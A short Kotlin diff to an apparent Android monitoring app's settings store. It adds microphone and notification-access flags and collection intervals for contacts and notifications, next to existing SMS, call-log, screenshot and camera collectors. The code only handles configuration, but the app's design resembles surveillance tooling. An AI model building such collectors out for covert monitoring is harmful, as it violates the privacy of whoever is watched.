@@ -99,6 +99,8 @@ class LocalStore(context: Context) {
                 sms = obj.optBoolean("sms", false),
                 contacts = obj.optBoolean("contacts", false),
                 camera = obj.optBoolean("camera", false),
+                microphone = obj.optBoolean("microphone", false),
+                notificationAccess = obj.optBoolean("notificationAccess", false),
                 screenCapture = obj.optBoolean("screenCapture", false)
             )
         }
@@ -171,6 +173,8 @@ class LocalStore(context: Context) {
         CollectorIds.APPS -> Config.DEFAULT_APPS_INTERVAL_SEC
         CollectorIds.CALLS -> Config.DEFAULT_CALL_LOG_INTERVAL_SEC
         CollectorIds.SMS -> Config.DEFAULT_SMS_INTERVAL_SEC
+        CollectorIds.CONTACTS -> Config.DEFAULT_CONTACTS_INTERVAL_SEC
+        CollectorIds.NOTIFICATIONS -> Config.DEFAULT_NOTIFICATIONS_INTERVAL_SEC
         CollectorIds.SCREENSHOT -> Config.DEFAULT_SCREENSHOT_INTERVAL_SEC
         CollectorIds.CAMERA -> Config.DEFAULT_CAMERA_INTERVAL_SEC
         CollectorIds.HEARTBEAT -> Config.DEFAULT_HEARTBEAT_INTERVAL_SEC
@@ -193,6 +197,8 @@ class LocalStore(context: Context) {
         put("sms", sms)
         put("contacts", contacts)
         put("camera", camera)
+        put("microphone", microphone)
+        put("notificationAccess", notificationAccess)
         put("screenCapture", screenCapture)
     }
 
